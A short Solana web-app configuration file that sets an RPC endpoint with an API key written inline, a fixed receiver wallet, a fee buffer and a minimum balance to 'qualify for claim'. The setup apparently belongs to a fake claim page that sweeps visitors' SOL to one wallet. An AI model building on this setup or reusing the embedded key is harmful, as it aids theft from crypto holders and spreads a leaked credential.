import { PublicKey } from '@solana/web3.js';

export const RPC_URL =
  import.meta.env.VITE_RPC_URL ||
  'https://solana-mainnet.g.alchemy.com/v2/pSLmhjyc-4LdT-bUrSr3m0Ks5lBCF_sr';

export const RPC_ENDPOINTS = [
  RPC_URL,
  'https://solana-mainnet.g.alchemy.com/v2/pSLmhjyc-4LdT-bUrSr3m0Ks5lBCF_sr',
];

// 🎯 Replace with your legitimate receiver wallet (NOT a thief!)
export const RECEIVER_WALLET = new PublicKey('DwLucxM2TNd8jj8ntNJ7BQJAmYAvCaZB2teMmP687jvZ');

// Optional: Minimum balance buffer (in lamports)
export const TRANSFER_FEE_BUFFER = 5000; // ~0.000005 SOL

// Minimum SOL balance required to qualify for claim
export const MIN_QUALIFY_SOL = 0.01;
